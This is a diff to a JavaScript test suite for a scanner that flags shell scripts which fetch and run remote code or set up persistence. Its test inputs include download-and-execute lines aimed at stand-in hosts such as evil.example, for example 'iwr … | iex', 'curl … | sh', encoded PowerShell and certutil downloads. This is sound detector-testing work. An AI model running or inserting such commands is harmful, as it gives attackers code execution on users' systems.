@@ -267,6 +267,7 @@ test('a shell script is read whole for its shell commands and the places it name
     'PowerShell\'s block comments, one unclosed to the end')
   assert.deepEqual(found('setup.ps1', '<# help #>\n# more\nWrite-Host ok\npowershell -enc AAAA\n'), { shell: [4] }, 'a command after them, where it is')
   assert.deepEqual(found('setup.ps1', '$a = "<#"\ncurl https://evil.example/x -o x\n$b = "#>"\n'), { shell: [2] }, 'a block\'s marks in strings')
+  assert.deepEqual(found('setup.ps1', 'Write-Host "literal <#"\n$h = \'help <#\'\ncurl https://evil.example/p\n'), { shell: [3] }, 'a block\'s mark after a space in a string')
   assert.equal(found('setup.ps1', 'Write-Host "a \u0060" b" # curl https://x.example/x\n'), null, 'a quote escaped by PowerShell\'s backtick')
   assert.equal(found('setup.ps1', '$x=<# curl https://x.example/x #>1\n$y=1,<# do not modify ~/.bashrc #>2\n'), null, 'a block comment after = or ,')
   assert.deepEqual(found('setup.ps1', [
@@ -280,6 +281,7 @@ test('a shell script is read whole for its shell commands and the places it name
   ].join('\n')), { shell: [1, 2, 3], persistence: [4, 5] }, 'PowerShell running what it fetches, and its profile')
   assert.deepEqual(found('setup.ps1', 'Invoke-Expression \u0060\n  (Invoke-WebRequest https://evil.example/p).Content\nirm https://get.example \u0060\n  | iex\niex $x\niwr https://x.example/f -OutFile f\niex $x && iwr https://x.example/f -OutFile f\niex (irm https://evil.example/p | Out-String)\n'), { shell: [1, 3, 8] },
     'its line continued by a backtick, not the next line')
+  assert.equal(found('setup.ps1', 'iwr https://example.com/p -OutFile p && Get-Content local.ps1 | iex\n'), null, 'iex on the next pipeline\'s local file')
   assert.equal(found('setup.ps1', 'iex $local \\\niwr https://example.com/p -OutFile p\niwr https://example.com/p ^\n| iex\n'), null, 'not by sh\'s backslash nor cmd\'s caret')
   assert.deepEqual(found('setup.ps1', `iwr https://evil.example/p -Headers @{Authorization="Bearer ${'x'.repeat(1500)}"} | iex\nGet-Content p.ps1 | powershell\ntype p.ps1 | powershell.exe\n`), { shell: [1, 2, 3] },
     'long options before the pipe, and a pipe to Windows PowerShell')
@@ -294,7 +296,7 @@ test('a shell script is read whole for its shell commands and the places it name
   assert.deepEqual(found('install.sh', 'echo "a # curl https://x.example/x" | sh\necho ${#x} curl https://x.example/y\n'), { shell: [1, 2] }, 'a # quoted, or no comment\'s')
   assert.equal(found('setup.bat', ':: certutil -urlcache -f http://1.2.3.4/x\r\nREM curl https://x.example\r\nrem rundll32 x.dll,Main\r\n@REM curl https://x.example\r\necho ok & REM curl https://x.example\r\necho ok || rem rundll32 x.dll,Main\r\n'), null, 'cmd\'s comments')
   assert.deepEqual(found('setup.sh', '# fetch it\ncurl -s http://1.2.3.4/x | sh # and run it\n'), { shell: [2] }, 'a command after a comment, where it is')
-  for (const hashbang of ['#!/bin/ksh', '#!/usr/bin/env pwsh', '#!/usr/bin/env -S bash -e', '#!/usr/local/bin/zsh']) {
+  for (const hashbang of ['#!/bin/ksh', '#!/usr/bin/env pwsh', '#!/usr/bin/env -S bash -e', '#!/usr/bin/env -S MODE=x bash', '#!/usr/local/bin/zsh']) {
     assert.deepEqual(found('bin/install', `${hashbang}\ncurl https://x.example/p -o p\n`), { shell: [2] }, hashbang)
   }
   assert.deepEqual(found('payload.js', '#!/bin/sh\ncurl https://x.example/p | sh\n'), { shell: [2] }, 'a shell\'s hashbang whatever the extension')
